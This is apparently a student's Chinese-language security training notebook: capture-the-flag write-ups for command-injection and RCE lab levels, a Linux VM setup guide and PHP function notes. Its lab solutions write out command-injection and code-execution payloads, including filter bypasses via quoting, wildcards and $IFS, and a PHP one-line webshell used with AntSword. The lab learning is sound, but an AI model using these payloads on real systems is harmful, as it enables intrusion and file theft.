# <font style="color:#000000;">一、</font><font style="color:#000000;">Ctfhub-RCE模块----命令注入</font>
![](https://cdn.nlark.com/yuque/0/2025/png/50616406/1736869042716-628c0662-eaa9-4b52-8bd7-8417c08ede64.png)

<font style="color:#000000;">打开环境后发现这个页面，按照上课讲的，肯定是先访问自己</font>![](https://cdn.nlark.com/yuque/0/2025/png/50616406/1736869098526-6d23292f-0405-419f-b82a-e3755dd5fcca.png)

<font style="color:#000000;">接着出现了数组</font>

![](https://cdn.nlark.com/yuque/0/2025/png/50616406/1736869347310-3b4327cf-06f7-443d-976f-90f3addbfdc9.png)

<font style="color:#000000;">之后</font><font style="color:#000000;">列出目录内容，看一下文件有哪些</font>

```shell
?ip=127.0.0.1;ls
```

![](https://cdn.nlark.com/yuque/0/2025/png/50616406/1736869085155-53941a9c-04d7-47a1-863f-a4fd3ef058f9.png)

<font style="color:#000000;">查看这个2760816330439.php文件</font>

```shell
?ip=127.0.0.1;ls;cat 2760816330439.php
```

![](https://cdn.nlark.com/yuque/0/2025/png/50616406/1736869042753-4fa0310d-29ae-484e-9482-30a2696a875f.png)

<font style="color:#000000;">再查看页面源代码就可以了得到flag了：ctfhub{4ce5f47f3595fceda2ebb063}</font>

![](https://cdn.nlark.com/yuque/0/2025/png/50616406/1736869042691-bdb910eb-814f-4834-ae39-e1d39d3422eb.png)

<font style="color:#000000;">又忍耐不住自己的好奇心，查看了index文件，感觉这个好像是这个页面的文件。</font>

![](https://cdn.nlark.com/yuque/0/2025/png/50616406/1736869234542-d14ace8b-abe1-4236-b7b7-905088fd87c0.png)

# <font style="color:#000000;">二、RCE-labs[0-8]题</font>
## <font style="color:#000000;">（一）</font><font style="color:#000000;">[RCE-labs]Level 0 -  代码执行&命令执行</font>
<font style="color:#000000;">打开靶场后发现以下内容：</font>

![](https://cdn.nlark.com/yuque/0/2025/png/50616406/1736899733389-cf8ffae0-a3e0-4f7e-ae16-97fb24972faa.png)

<font style="color:#000000;">这个应该是一个学习的靶场，毕竟flag直接给出了</font>

<font style="color:#000000;">分析一下代码：</font>

```php
<?php 
```

<font style="color:#000000;">php代码开始标志</font>

<font style="color:#000000;"></font>

```php
include ("get_flag.php");
```

<font style="color:#000000;">include文件包含，把get_flag.php文件包含进来</font>

<font style="color:#000000;"></font>

```php
$code = "include('flag.php');echo 'This will get the flag by eval PHP code: '.\$flag;";

$bash = "echo 'This will get the flag by Linux bash command - cat /flag: ';cat /flag";
```

<font style="color:#000000;">声明两个变量并把两个字符串分别写进code变量和bash变量中</font>

<font style="color:#000000;"></font>

```php
eval($code);
```

<font style="color:#000000;">把code变量里的内容作为代码执行，即执行以下代码，把flag.php包含进来并且输出，其中 ./  代表在当前目录中访问flag.php文件</font>

```php
include('flag.php');
echo 'This will get the flag by eval PHP code: '.\$flag;
```

<font style="color:#000000;"></font>

```php
echo "<br>";
```

<font style="color:#000000;">换行，<br>是换行符</font>

<font style="color:#000000;"></font>

```shell
system($bash)
```

<font style="color:#000000;">system是执行外部程序并且显示输出，所以执行以下命令，输出flag</font>

```php
echo 'This will get the flag by Linux bash command - cat /flag: ';cat /flag
```

<font style="color:#000000;">其中cat 是Linux命令含义是查看文件内容，cat /flag 即查看flag</font>

## <font style="color:#000000;">（二） </font><font style="color:#000000;">[RCE-labs]Level 1 - 一句话木马和代码执行</font>
<font style="color:#000000;">打开靶场发现以下内容，这主要还是来学习的</font>

![](https://cdn.nlark.com/yuque/0/2025/png/50616406/1736919959812-c51d3e5c-a7ab-4fac-9cf7-f3644814b211.png)

<font style="color:#000000;">分析代码：</font>

```php
<?php 
```

<font style="color:#000000;">php代码开头</font>

<font style="color:#000000;"></font>

```php
include ("get_flag.php");
```

<font style="color:#000000;">把get_flag,php包含进来</font>

<font style="color:#000000;"></font>

```php
eval($_POST['a']);
```

<font style="color:#000000;">把POST传参的字符串当作代码执行</font>

<font style="color:#000000;"></font>

```php
highlight_file(__FILE__);
```

<font style="color:#000000;">对指定的PHP 文件进行语法高亮显示</font>

<font style="color:#000000;"></font>

```php
?>
```

<font style="color:#000000;">PHP代码结束标志</font>

<font style="color:#000000;"></font>

<font style="color:#000000;">所以用POST传参就可以得到flag</font>

```php
a=echo $flag;
```

![](https://cdn.nlark.com/yuque/0/2025/png/50616406/1736944964641-1505e62c-bd72-4d84-8ece-3deec5d804db.png)

<font style="color:#000000;"></font>

<font style="color:#000000;">在课程中学长也介绍了第二种解体方法，就是用中国蚁剑</font>

<font style="color:#000000;">打开中国蚁剑，看看文件</font><font style="color:#000000;"></font>

![](https://cdn.nlark.com/yuque/0/2025/png/50616406/1736920820579-2ec5aaab-05c2-4d55-a4a1-51eed600ec10.png)

<font style="color:#000000;">就直接在根目录找到了flag</font>

![](https://cdn.nlark.com/yuque/0/2025/png/50616406/1736920820575-8b9522dc-66b4-45d8-9abb-70274b972836.png)

<font style="color:#000000;">打开后得到flag</font>

![](https://cdn.nlark.com/yuque/0/2025/png/50616406/1736920820473-aeba862f-1806-4394-b268-0ddc4c8a15fb.png)

<font style="color:#000000;">但是又发现了这个文件，hhh不建议直接在根目录拿flag</font>

![](https://cdn.nlark.com/yuque/0/2025/png/50616406/1736920971951-b0d56482-54b0-46e1-959d-36d0ccd49986.png)

## <font style="color:#000000;">（三）</font><font style="color:#000000;">[RCE-labs]Level 2 - PHP代码执行函数</font>
<font style="color:#000000;">打开靶场发现以下内容，是很长的PHP代码</font>

![](https://cdn.nlark.com/yuque/0/2025/png/50616406/1736945242221-1aee7e38-7229-493d-8803-78d728099e19.png)

<font style="color:#000000;"></font>

<font style="color:#000000;">简单分析代码：</font>

```php
<?php 
include ("get_flag.php");
global $flag;

session_start();
```

<font style="color:#000000;">把get_flag.php包含进来，并声明了flag为超级全局变量，说明变量flag在一个脚本的全部作用域中都可用并开启session</font>

<font style="color:#000000;">session_start();是PHP中的一个函数，用于启动一个会话。当一个用户访问网站时，会话（Session）是用来存储用户特定数据的一种机制，这些数据可以被多个页面共享。通过启动会话，PHP能够识别用户，并在用户的多次请求之间保存数据。</font>

<font style="color:#000000;"></font>

```php
function hello_ctf($function, $content){
    global $flag;
    $code = $function . "(" . $content . ");";
    echo "Your Code: $code <br>";
    eval($code);
}
```

<font style="color:#000000;">定义了一个函数叫hello_ctf，其中两个变量是function, content。之后把变量function和"(" . $content . ");"链接起来赋值给code，之后输出Your Code: $code 并换行，最后将code里的字符串作为代码输出</font>

<font style="color:#000000;"></font>

```php
function get_fun(){

    $func_list = ['eval','assert','call_user_func','create_function','array_map','call_user_func_array','usort','array_filter','array_reduce','preg_replace'];

    if (!isset($_SESSION['random_func'])) {
        $_SESSION['random_func'] = $func_list[array_rand($func_list)];
    }
    
    $random_func = $_SESSION['random_func'];

    $url_fucn = preg_replace('/_/', '-', $_SESSION['random_func']);
    
    echo "获得新的函数: $random_func ，去 https://www.php.net/manual/zh/function.".$url_fucn.".php 查看函数详情。<br>";

    return $_SESSION['random_func'];
}
```

<font style="color:#000000;">这段代码定义了一个函数get_fun，func_list是一个包含多个PHP内置函数的数组。</font>

<font style="color:#000000;">之后如果代码$_SESSION不存在，则通过array_rand随机选择func_list里的函数。</font>

<font style="color:#000000;">再然后把$_SESSION赋值给random_func。然后把所选函数名的下划线变为短横线。</font>

<font style="color:#000000;">之后输出一个消息，告诉所选的函数名并提供一个PHP官方的手册链接。</font>

<font style="color:#000000;">最后返回在 $_SESSION里的函数名</font>

<font style="color:#000000;"></font>

```php
function start($act){

    $random_func = get_fun();
    
    if($act == "r"){ /* 通过发送GET ?action=r 的方式可以重置当前选中的函数 —— 或者你可以自己想办法可控它x */
        session_unset();
        session_destroy(); 
    }

    if ($act == "submit"){
        $user_content = $_POST['content']; 
        hello_ctf($random_func, $user_content);
    }
}
```

<font style="color:#000000;">这个函数定义了start函数</font><font style="color:#000000;">。</font>

<font style="color:#000000;">把get_fun()的返回值赋值给$random_fun。</font>

<font style="color:#000000;">如果形参act的值是r，则执行 session_unset();session_destroy(); 两个函数。</font>

_<font style="color:#000000;"> session_unset()为释放当前在内存中已经创建的所有$_SESSION变量，但不删除session文件以及不释放对应的sessionidsession_destroy()</font>_

_<font style="color:#000000;">session_destroy()为删除当前用户对应的session文件以及释放sessionid，内存中的$_SESSION变量内容依然保留</font>_

<font style="color:#000000;">如果act的值是submit则把content POST传参的值赋值给 $user_content，之后执行hello_ctf函数</font>

<font style="color:#000000;"></font>

```php
isset($_GET['action']) ? start($_GET['action']) : '';

highlight_file(__FILE__);

?>
```

<font style="color:#000000;">检查action是否为随机值，如果是则没有回显，如果有则执行start函数</font>

<font style="color:#000000;"></font>

<font style="color:#000000;">所以这道题需要先把action，GET传参，值是submit，来调用hello_ctf函数来输出$flag。想要输出flag的话，就需要利用content POST传参来传入输出flag的函数即eval函数或者其他相关函数。</font>

<font style="color:#000000;">所以GET,POST传参如下</font>

```plain
?action=submit
content=eval('echo $flag;')
```

<font style="color:#000000;">得到flag</font>

![](https://cdn.nlark.com/yuque/0/2025/png/50616406/1736950434048-5669a1ab-fe09-4d18-9715-134492e9fd91.png)

<font style="color:#000000;"></font>

<font style="color:#000000;">注意到题上还说”PHP还有许多回调函数也可以直接或者间接的执行PHP代码。“</font>

<font style="color:#000000;">查了资料，assert就可以，但它无法执行关于echo的代码，起初以为是echo是语言构造器的原因，但是用了同为语言构造器的print，发现却能用</font>

<font style="color:#000000;">所以，最后GET,POST也可传参如下</font>

```plain
?action=submit
content=assert(print_r($flag))
```

<font style="color:#000000;">得到flag</font>

![](https://cdn.nlark.com/yuque/0/2025/png/50616406/1736948907826-b147caf5-7165-4653-961f-3b8c5668f7aa.png)

## <font style="color:#000000;">（四）</font><font style="color:#000000;">[RCE-labs]Level 3 - 命令执行</font>
<font style="color:#000000;">打开靶场发现以下内容</font>

## ![](https://cdn.nlark.com/yuque/0/2025/png/50616406/1736951372909-00eaf283-fe07-4834-b561-1778d9513639.png)
<font style="color:#000000;">由于system()函数会通过sh软件连接执行输入的系统命令，所以只需要POST传入访问flag命令就行</font>

```plain
a=cat /flag;
```

![](https://cdn.nlark.com/yuque/0/2025/png/50616406/1737124450767-e315173a-34dc-4813-b9c2-9fe5f03e1acf.png)

## <font style="color:#000000;">（五）[RCE-labs]Level 4 - SHELL 运算符</font>
<font style="color:#000000;">进入靶机发现以下题目</font>

![](https://cdn.nlark.com/yuque/0/2025/png/50616406/1737124467767-57170292-4b96-4989-8acc-d82db997fe77.png)

<font style="color:#000000;">PHP代码如下：</font>

```php
<?php 
  function hello_server($ip){
  system("ping -c 1 $ip");
  }

  isset($_GET['ip']) ? hello_server($_GET['ip']) : null;

highlight_file(__FILE__);

?>
```

<font style="color:#000000;">分析代码：</font>

<font style="color:#000000;">首先定义了一个函数 hello_server，其中形参是$ip，执行system函数，函数的内容是ping -c 1 ，指的是向目标 IP 发送 一个ICMP 请求，并等待其响应 。函数结束</font>

<font style="color:#000000;">之后判断GET传参的ip是否为随机值，如果不是随机值的话执行函数hello_server，如果是随机值的话，则不再执行其他操作。</font>

<font style="color:#000000;">所以需要传入127.0.0.1来指向自己并且在后面加入输出flag的命令，即</font>

```plain
?ip=127.0.0.1;cat /flag;
```

![](https://cdn.nlark.com/yuque/0/2025/png/50616406/1737125338492-6594f63e-9609-4a4c-91c6-b7a64009284b.png)

## <font style="color:#000000;">（六）</font><font style="color:#000000;">[RCE-labs]Level 5 - 黑名单式过滤</font>
<font style="color:#000000;">打开靶场发现以下内容</font>

![](https://cdn.nlark.com/yuque/0/2025/png/50616406/1737126533765-55c4411a-3c39-49de-a502-f98fa4afef3e.png)

```php
<?php
function hello_shell($cmd){
  if(preg_match("/flag/", $cmd)){
    die("WAF!");
  }
  system($cmd);
}

isset($_GET['cmd']) ? hello_shell($_GET['cmd']) : null;

highlight_file(__FILE__);


?>
```

<font style="color:#000000;">preg_match()函数是匹配函数，</font><font style="color:#000000;">如果找到一个匹配</font><font style="color:#000000;">，则返回值为1，否则为0</font>

<font style="color:#000000;">这段PHP代码先是定义了一个hello_shell函数，形参是cmd。</font>

<font style="color:#000000;">之后判断cmd变量与flag是否匹配，如果，则输出WAF!，否则执行system函数。函数结束</font>

<font style="color:#000000;">然后判断GET传参的cmd是否为随机值，如果是，则执行hello_shell函数，否则什么也不执行</font>

<font style="color:#000000;"></font>

<font style="color:#000000;">所以要把cat /flag修饰以下，而又</font><font style="color:#000000;">用$*绕过，即fl$*ag、用'绕过，即f''lag或f'l'ag绕过，这都可以，</font><font style="color:#000000;">因此构造playload，得到flag</font>

```php
?cmd=cat /fl''ag
```

![](https://cdn.nlark.com/yuque/0/2025/png/50616406/1737127527733-5f4cff11-bcc7-4f21-bf58-8195ab732d7b.png)

## <font style="color:#000000;">（七）</font><font style="color:#000000;">[RCE-labs]Level 6 - 通配符匹配绕过</font>
<font style="color:#000000;">打开靶场发现以下内容，是PHP代码</font>

![](https://cdn.nlark.com/yuque/0/2025/png/50616406/1737127875645-cc2125db-6b75-43db-8bbb-fb6287e0bce1.png)

<font style="color:#000000;">这是上一题的加强版,代码如下</font>

```php
<?php
function hello_shell($cmd){
    if(preg_match("/[b-zA-Z_@#%^&*:{}\-\+<>\"|`;\[\]]/", $cmd)){
        die("WAF!");
    }
    system($cmd);
}

isset($_GET['cmd']) ? hello_shell($_GET['cmd']) : null;

highlight_file(__FILE__);


?>
```

<font style="color:#000000;">这题与上一题的不同在于多了几个符号[b-zA-Z_@#%^&*:{}\-\+<>\"|`;\[\]]</font>

<font style="color:#000000;"> 匹配范围为：</font>

<font style="color:#000000;">所有字母（除了小写字母 </font>`<font style="color:#000000;">a</font>`<font style="color:#000000;">）</font>

<font style="color:#000000;">特殊字符  _ @ # % ^ & * : { } - + < > " | ; [ ]`</font>

<font style="color:#000000;">由于</font><font style="color:#000000;">?代表的是匹配一个字符</font>

<font style="color:#000000;">所以构造palyload：</font>

```php
?cmd=/???/?a??64 /??a? 
```

<font style="color:#000000;">代表</font>

```php
?cmd=/cat/base64 /flag 
```

<font style="color:#000000;">得到</font>

![](https://cdn.nlark.com/yuque/0/2025/png/50616406/1737130165777-98aa4e98-1735-48a5-92c8-31380a22beff.png)

<font style="color:#000000;">再base64解码的得flag</font>

![](https://cdn.nlark.com/yuque/0/2025/png/50616406/1737130120413-f219ad16-a3e9-4bbb-aa1f-5e2e7c2b135c.png)

## <font style="color:#000000;">（八）</font><font style="color:#000000;">[RCE-labs]Level 7 - 空格过滤</font>
<font style="color:#000000;">打开靶场发现以下内容，是PHP代码</font>

## ![](https://cdn.nlark.com/yuque/0/2025/png/50616406/1737130554364-714b2bbc-b979-4439-a401-b07301a098a0.png)
```php
<?php
function hello_shell($cmd){
    if(preg_match("/flag| /", $cmd)){
        die("WAF!");
    }
    system($cmd);
}

isset($_GET['cmd']) ? hello_shell($_GET['cmd']) : null;

highlight_file(__FILE__);


?>
```

<font style="color:#000000;">这次又变成了绕过空格</font>

<font style="color:#000000;">题目上给的提示有$IFS可以代表空格</font>

<font style="color:#000000;">所以构造playload</font>

```plain
?cmd=cat$IFS/fl''ag
```

![](https://cdn.nlark.com/yuque/0/2025/png/50616406/1737130789222-99f02fff-6a45-4ba8-90e7-0f165eb99d4c.png)

## <font style="color:#000000;">（九）</font><font style="color:#000000;">[RCE-labs]Level 8 - 文件描述和重定向</font>
![](https://cdn.nlark.com/yuque/0/2025/png/50616406/1737130925697-9bcc61fa-32f2-4a6b-8455-345c8a3d737f.png)

<font style="color:#000000;">看了提示：/dev/null 是一个特殊的文件，写入到它的内容都会被丢弃；如果尝试从该文件读取内容，那么什么也读不到，并且/dev/null 将不会有任何回显，但会回显错误，加上 2>&1 后连错误也会被屏蔽掉</font>

<font style="color:#000000;">PHP代码如下:</font>

```php
<?php 
function hello_shell($cmd){
    /*>/dev/null 将不会有任何回显，但会回显错误，加上 2>&1 后连错误也会被屏蔽掉*/
    system($cmd.">/dev/null 2>&1");
}

isset($_GET['cmd']) ? hello_shell($_GET['cmd']) : null;

highlight_file(__FILE__);


?>
```

<font style="color:#000000;">查阅资料，写这种题可以</font><font style="color:#000000;">尝试将cat /flag的输出重定向到一个临时文件中，然后再通过其他命令读取这个临时文件的内容</font>

<font style="color:#000000;">创建临时文件：</font>

```plain
cat /flag > /tmp/temp_flag
```

<font style="color:#000000;">读取临时文件内容：</font>

```plain
cat /tmp/temp_flag
```

<font style="color:#000000;">将这两个命令组合起来，可以构造如下命令：</font>

```plain
cat /flag > /tmp/temp_flag; cat /tmp/temp_flag;
```

<font style="color:#000000;">所以构造payload：</font>

```plain
?cmd=cat /flag > /tmp/temp_flag; cat /tmp/temp_flag;
```

<font style="color:#000000;">得到flag</font>

![](https://cdn.nlark.com/yuque/0/2025/png/50616406/1737131517139-50459889-2f3d-482a-9f0f-63f1589d844b.png)

# <font style="color:#000000;">三、Linux环境搭建</font>
<font style="color:#000000;">由于之前在开课前做准备工作的时候已经搭建好了一个Linux环境，没截图，所以就大概说一下吧</font>

1. <font style="color:#000000;">下载并安装VMware</font>

<font style="color:#000000;">在</font><font style="color:#000000;">HnuSec2025冬季培训</font><font style="color:#000000;">❄️</font><font style="color:#000000;">群里有安装包</font>

![](https://cdn.nlark.com/yuque/0/2025/png/50616406/1737132098742-43adea72-d552-4a1b-872c-bd18eeb93854.png)

<font style="color:#000000;">官网下载：</font>

[<font style="color:#117CEE;">https://www.vmware.com/products/desktop-hypervisor/workstation-and-fusion</font>](https://www.vmware.com/products/desktop-hypervisor/workstation-and-fusion)

<font style="color:#000000;">之后打开安装包设置好路径添加path就行</font>

2. <font style="color:#000000;">安装映像</font>

<font style="color:#000000;">打开VMware后，需要选择一个虚拟机的光盘映像文件，我这里选择的是</font><font style="color:#000000;">ubuntu</font><font style="color:#000000;">的，可以去ubuntu下载：</font>[<font style="color:#000000;">官网跳转链接</font>](https://cn.ubuntu.com/download/desktop)

<font style="color:#000000;">下载好之后就是这个文件</font>

![](https://cdn.nlark.com/yuque/0/2025/png/50616406/1737132614360-69c37838-cb17-4e33-845f-7b339001c85b.png)

3. <font style="color:#000000;">新建虚拟机</font>

<font style="color:#000000;">基本上都是选择默认，如果有其他需求可以适当改一下</font>

![](https://cdn.nlark.com/yuque/0/2025/png/50616406/1737132745911-0837e66d-e934-4adc-aa4c-cc5e4d984281.png)![](https://cdn.nlark.com/yuque/0/2025/png/50616406/1737132767120-d714a311-3bd7-46cd-a8f9-bb6fc4dbd76a.png)

![](https://cdn.nlark.com/yuque/0/2025/png/50616406/1737132782984-37ab8bd1-54ef-4567-b7d5-277a8d6fb758.png)![](https://cdn.nlark.com/yuque/0/2025/png/50616406/1737132792199-8c164909-8abd-4e22-bb70-e586a6d2994e.png)

![](https://cdn.nlark.com/yuque/0/2025/png/50616406/1737132834700-2bb2eb3e-70fd-45c6-b49b-ff0b596db713.png)![](https://cdn.nlark.com/yuque/0/2025/png/50616406/1737132847080-e506a61c-c3f8-4b79-8950-4609248dd0d1.png)

![](https://cdn.nlark.com/yuque/0/2025/png/50616406/1737132857606-8bc92a1a-cc19-4047-8f09-31ed223c5d9a.png)![](https://cdn.nlark.com/yuque/0/2025/png/50616406/1737132866152-4001408d-7a3e-4a53-98e3-7844c49a55ec.png)

![](https://cdn.nlark.com/yuque/0/2025/png/50616406/1737132874793-a5768df2-e1f5-4a16-aceb-434918db89af.png)![](https://cdn.nlark.com/yuque/0/2025/png/50616406/1737132882743-b7baddda-d2a2-46d9-b957-e59f3a252d29.png)![](https://cdn.nlark.com/yuque/0/2025/png/50616406/1737132907066-308edd5f-e46f-4377-bd26-60bbd848acdb.png)![](https://cdn.nlark.com/yuque/0/2025/png/50616406/1737132918740-170fc6a1-6516-4f1a-86b9-67bf84f55747.png)![](https://cdn.nlark.com/yuque/0/2025/png/50616406/1737132925361-67f86b6d-608d-446e-834e-c142ba56e60f.png)![](https://cdn.nlark.com/yuque/0/2025/png/50616406/1737132948725-fb887163-8bc5-4ee7-9e28-81c6393e3245.png)

<font style="color:#000000;">在最后一步选择自定义硬件，点击新CD/DVD(SATA)，选择使用ISO镜像文件，之后点击完成</font>

![](https://cdn.nlark.com/yuque/0/2025/png/50616406/1737132966791-76ce93fa-7f54-46a6-a4cc-4c7bc4cf63fb.png)

<font style="color:#000000;">打开虚拟机，要设置语言、地区、用户名、密码等操作，之后虚拟机会重启</font>

<font style="color:#000000;">可以执行以下命令</font><font style="color:#000000;">安装常用的包和工具</font>

```plain
# 切换到root用户，避免重复输入sudo
sudo su

# 更新软件包列表，获取最新的软件包信息
sudo apt update -y

# 升级已安装的所有软件包到最新版本
sudo apt upgrade -y

# 安装build-essential，包含了编译软件所需的基本工具，如gcc、g++和make等
sudo apt install build-essential -y

# 安装git版本控制系统，用于代码管理和版本控制
sudo apt install git -y

# 安装zip和unzip工具，用于处理压缩文件
sudo apt install zip unzip -y

# 安装网络工具包：
# net-tools：包含ifconfig、netstat等常用网络命令
# curl：用于发送HTTP请求的命令行工具
# wget：用于从网络下载文件的工具
sudo apt install net-tools curl wget -y

# 安装SSH服务器，允许远程安全连接到此服务器
sudo apt install openssh-server -y

# 停止ufw防火墙服务
# 注意：在生产环境中建议保持防火墙开启，根据个人情况决定
sudo systemctl stop ufw -y

# 禁用ufw防火墙开机自启
# 注意：在生产环境中建议保持防火墙启用，根据个人情况决定
sudo systemctl disable ufw -y

```

<font style="color:#000000;">这下虚拟机的配置基本完成了</font>

4. <font style="color:#000000;">linux操作笔记ls ：  
</font><font style="color:#000000;">ls ：列出当前目录的文件和文件夹。  
</font><font style="color:#000000;">ls -l ：以详细列表形式显示。</font>

<font style="color:#000000;">ls -a ：显示所有文件，包括隐藏文件。  
</font><font style="color:#000000;">cd ：切换目录  
</font><font style="color:#000000;">cd 目录名 ：进⼊指定目录。  
</font><font style="color:#000000;">cd .. ：返回上⼀级目录。  
</font><font style="color:#000000;">cd ~ ：回到用户的主目录。  
</font><font style="color:#000000;">pwd ：显⽰当前所在目录  
</font><font style="color:#000000;">mkdir ：创建目录  
</font><font style="color:#000000;">mkdir 目录名 ：创建⼀个新的⽬录。  
</font><font style="color:#000000;">rmdir ：删除空目录  
</font><font style="color:#000000;">rmdir 目录名 ：删除⼀个空的目录。  
</font><font style="color:#000000;">rm ：删除文件或目录  
</font><font style="color:#000000;">rm ⽂件名 ：删除⽂件。  
</font><font style="color:#000000;">rm -r 目录名 ：递归删除目录及其内容（谨慎使⽤）。  
</font><font style="color:#000000;">cp ：复制文件或目录  
</font><font style="color:#000000;">cp 源文件 目标文件 ：复制文件。  
</font><font style="color:#000000;">cp -r 源目录 目标目录 ：复制目录目录。  
</font><font style="color:#000000;">mv ：移动或重命名文件或目录  
</font><font style="color:#000000;">mv 源文件 目标文件 ：重命名文件。  
</font><font style="color:#000000;">mv 源文 目标目录 ：移动文件到目标目录。  
</font><font style="color:#000000;">cat ：查看文件内容。</font>

<font style="color:#000000;">简单操作了以下</font>

![](https://cdn.nlark.com/yuque/0/2025/png/50616406/1737135007653-dd6267d5-7ad0-4971-8fae-88dd68e88dc3.png)![](https://cdn.nlark.com/yuque/0/2025/png/50616406/1737135006834-3e80beca-aa4c-4f85-9b27-b22bf8ce3b6f.png)![](https://cdn.nlark.com/yuque/0/2025/png/50616406/1737135007082-ac344310-9ff0-4cda-b926-5cc304c3f35f.png)![](https://cdn.nlark.com/yuque/0/2025/png/50616406/1737135007042-2882f6ed-7daf-46ce-a630-b2b02d01876e.png)

# <font style="color:#000000;">四、PHP基本语法</font>
<font style="color:#000000;">之前写过笔记了再加上一点新学的：</font>

1. <font style="color:#000000;">evel（）函数 </font>

<font style="color:#000000;">eval() 函数是 PHP 中⼀个⾮常特殊的函数，它可以将⼀个字符串当作 PHP 代码来执行。这个功能 </font>

<font style="color:#000000;">非常强大，但也非常危险，如果使⽤不当，可能会导致严重的安全问题。 </font>

<font style="color:#000000;">eval() </font><font style="color:#000000;">函数的语法： </font>

```php
eval ( string $code ) : mixed 
```

<font style="color:#000000;">$code ：要执行的 PHP 代码字符串。 </font>

<font style="color:#000000;">eval() </font><font style="color:#000000;">函数的作用： </font>

<font style="color:#000000;">eval() </font><font style="color:#000000;">函数会将 </font><font style="color:#000000;">$code </font><font style="color:#000000;">字符串中的内容解析为 PHP 代码，并执⾏它。执⾏的代码会继承 </font>

<font style="color:#000000;">eval() 函数所在行的变量作用域。也就是说，在 eval() 中可以访问和修改 eval() 函数外部的变量。 </font>

2. <font style="color:#000000;">system()</font>

<font style="color:#000000;">system — 执行外部程序，并且显示输出</font>

3. <font style="color:#000000;">pcntl_exec() </font>

<font style="color:#000000;">pcntl_exec() 是 PHP 的⼀个函数，用于在 当前进程空间执行指定的程序。它属于 PHP 的 Process Control 扩展（pcntl），主要用于处理 Unix/Linux 系统中的进程管理。与之前提到的system() 、 exec() 、 shell_exec() 等函数不同， pcntl_exec() 不会创建新的子进程，而是替换当前进程。这意味着调用pcntl_exec() 之后，原来的 PHP 脚本将停止执行，取而代之的是执行指定的程序。 </font>

<font style="color:#000000;">函数原型： </font>

<font style="color:#000000;">$path : 要执行的程序的路径。可以是绝对路径或相对路径。 </font>

<font style="color:#000000;">$args : （可选）传递给程序的参数数组。</font>

<font style="color:#000000;">$envs : （可选）传递给程序的环境变量数组。</font>

4. <font style="color:rgb(31,35,41);">exec() </font>

<font style="color:rgb(31,35,41);">基本语法： </font>

```plain
string exec ( string $command , array &$output = null , int &$return_var = null 
) : string 
```

<font style="color:rgb(31,35,41);">$command : 要执行的命令，可以是任何有效的系统命令。 </font>

<font style="color:rgb(31,35,41);">$output : 可选参数，用于存储命令执行的输出结果。每⾏输出将作为数组的⼀个元素。 </font>

<font style="color:rgb(31,35,41);">$return_var : 可选参数，用于存储命令执行后的返回状态码。通常，状态码 0 表⽰命令成功执 </font>

<font style="color:rgb(31,35,41);">行。</font>

5. <font style="color:rgb(31,35,41);">var_dump </font>

<font style="color:#000000;">var_dump() 是 PHP 中⼀个非常有用的内置函数，主要用于输出变量的详细信息，包括变量的类型和值。它在调试代码和分析变量状态时非常有用。 </font>

<font style="color:#000000;">var_dump() 的作用： </font>

<font style="color:#000000;">显示变量的类型： 例如， int （整型）、 string （字符串）、 bool （布尔型）、 array （数组）、 object （对象）等。 </font>

<font style="color:#000000;">显示变量的值： 输出变量的具体内容。</font>

<font style="color:#000000;">递归展开数组和对象： 对于数组和对象， var_dump() 会递归地显示其内部的元素和属性，并使用缩进清晰地展示其结构。显示字符串的长度： 如果变量是字符串，还会显示字符串的长度</font>

6. <font style="color:#000000;">session_start();是PHP中的一个函数，用于启动一个会话。当一个用户访问网站时，会话（Session）是用来存储用户特定数据的一种机制，这些数据可以被多个页面共享。通过启动会话，PHP能够识别用户，并在用户的多次请求之间保存数据。</font>
7. PhpStorm环境配置完成![](https://cdn.nlark.com/yuque/0/2025/png/50616406/1737139725797-e79271a2-2507-4b8d-92e2-fa85f91c1164.png)

<font style="color:#000000;">附上之前PHP学习笔记链接：</font>[PHP学习及练习](https://github.com/Fischl0527/Fischl0527/blob/main/PHP%E5%AD%A6%E4%B9%A0%E5%8F%8A%E7%BB%83%E4%B9%A0.md)

# <font style="color:#000000;">五、学习笔记汇总</font>
<font style="color:#000000;">[任意代码执行行(Arbitrary Code Execution,ACE)]是指政击者在目标计算机或目标进行中运行攻击者选择的任何命令或代码的能力，这是一个广泛的概念，它涵盖了任何类型的代码运行过程，不仅包括系统层领的脚本或程序，也包括应用程序内部的函数或方法调用，在此基础上我们将通过网络触发任意代码执行的能力通常称为远程代码执行   [远程程代码执行(AFE.RranteCodeExecut1oe,RCE)]</font>

<font style="color:#000000;"></font>

<font style="color:#000000;">[命令执行(Conennd Execution)]     通常指的是在操作系统层面上执行预定义的指令或脚本，这些命令最终的组向通常是系统命令，如Windows中的CMD命令或Linux中的Shell命令，这在语言中可以体现为一些特定的函数或方法调用，如PHP中的shell_exec()函数。</font>

<font style="color:#000000;"></font>

<font style="color:#000000;">代码执行(CodeExecution)」在某个语言中，通过一些方式(通常为函数或者方法调用)执行该语言的任意代码的行为，如PHP中的eval()函数或Python中的exec()函数。当漏洞入口点可以执行任意代码时，我们称其为代码执行漏洞——这种漏洞包含了通过语言中对接系统命令的函数来执行系统命令的情况，比如eval("system('cat  /etc/passward')";)；也被归为代码执行漏洞。我们平时最常见的一句话木马就用的eval()函数，（一般情况下，为了接收更长的Payload，我们一般对可控参数使用POST传参）</font>

<font style="color:#000000;"></font>

<font style="color:rgb(31,35,41);">一句话木马是⼀种简短的恶意代码，通常⽤于在⽬标服务器上创建⼀个后门，以便攻击者远程控制该 </font>

<font style="color:rgb(31,35,41);">服务器或执行其他恶意操作。它主要出现在 Web 安全领域，特别是涉及 PHP、ASP、JSP 等动态语⾔ </font>

<font style="color:rgb(31,35,41);">的 Web 应用程序中。</font>

<font style="color:rgb(31,35,41);"></font>

<font style="color:#000000;">除开在一句话木马中最受欢迎用以直接执行php代码的 eval() 函数，php还有许多回调函数也可以直接或者间接的执行php代码。查了资料，assert就可以，但它无法执行关于echo的代码，但却能用print</font>

<font style="color:#000000;"></font>

<font style="color:#000000;">shell 运算符 可以用于控制命令的执行流程，使得你能够根据条件执行不同的命令。</font>

<font style="color:#000000;">&&(逻辑与运算符） 只有当第 1个命令 cmd_1执行成功 (返回值为 0)时，才会执行第2个命令 cmd_2 。例： mkdir test && cd test</font>

<font style="color:#000000;">(逻辑或运算符） 只有当第一个命令 cmd_1 执行失败 (返回值不为 0)时，才会执行第二个命令 cmd_2 。例： cd nonexistent_directory || echo "directory not found“</font>

<font style="color:#000000;">(后台运行符） 将命令 cmd_1 放到后台执行，shell 立即执行，cmd_2,两个命令并行执行。例： sleep 10 & echo "this will run immediately"</font>

